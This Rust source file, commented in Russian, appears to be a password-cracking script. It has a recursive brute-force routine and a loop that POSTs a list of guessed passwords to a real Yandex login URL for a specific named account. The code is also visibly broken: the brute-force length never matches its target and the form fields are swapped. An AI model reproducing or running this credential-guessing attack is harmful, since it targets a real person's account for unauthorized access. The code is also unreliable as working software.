use reqwest;
use tokio;

#[tokio::main]
async fn main() {
    let target_password = "pass";
    let characters: Vec<char> = "abcdefghijklmnopqrstuvwxyz\
    ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars().collect();
    // Символы, используемые для генерации паролей
    let password_length = 11;  // Длина пароля
    let initial_attempt = String::new();

    if let Some(result) = brute_force_password(target_password,
                                               password_length,
                                               initial_attempt, &characters) {
        println!("Пароль взломан: {}", result);
    } else {
        println!("Пароль не найден");
    }
    let passwords = vec!["dasaeras321", "password2", "password3"];
    // Заданные пароли
    let url = "https://passport.yandex.ru/auth/welcome?retpath=https%\
    3A%2F%2Foauth.yandex.ru%2Fauthorize%3Fclient_id%3De2281900ced84\
    819a1ae93143574c714%26response_type%3Dcode%26force_confirm%3D1%2\
    6redirect_uri%3Dhttps%253A%252F%252Fauth.mail.ru%252Fcgi-bin%252\
    Foauth2_yandex_callback%252F%26state%3Dprazdnikhimki%25\
    40yandex.ru-a4a9aa1cc668845788cf8a6a0ad6\
    715d&noreturn=1&origin=oauth&login=prazdnikhimki%40yandex.ru";
    // URL для аутентификации

    for password in passwords {
        let client = reqwest::Client::new();
        let response = client.post(url)
            .form(&[("prazdikhimki", "username"), ("password", password)])
            // Замените "username" на имя пользователя
            .send()
            .await;

        match response {
            Ok(res) => {
                if res.status().is_success() {
                    println!("Успешная аутентификация с паролем: {}", password);
                    break;  // Прерывание цикла после успешной аутентификации
                } else {
                    println!("Не удалось аутентифицироваться с паролем: {}",
                             password);
                }
            }
            Err(e) => println!("Ошибка при отправке запроса: {}", e),
        }
    }
}
fn brute_force_password(target_password: &str, password_length: usize,
                        attempt: String,
                        characters: &Vec<char>) -> Option<String> {
    if attempt.len() == password_length {
        return if attempt == target_password {
            Some(attempt)
        } else {
            None
        }
    }
    for &c in characters {
        let new_attempt = format!("{}{}", attempt, c);
        if let Some(result) = brute_force_password(target_password,
                                                   password_length, new_attempt,
                                                   characters) {
            return Some(result);
        }
    }
    None
}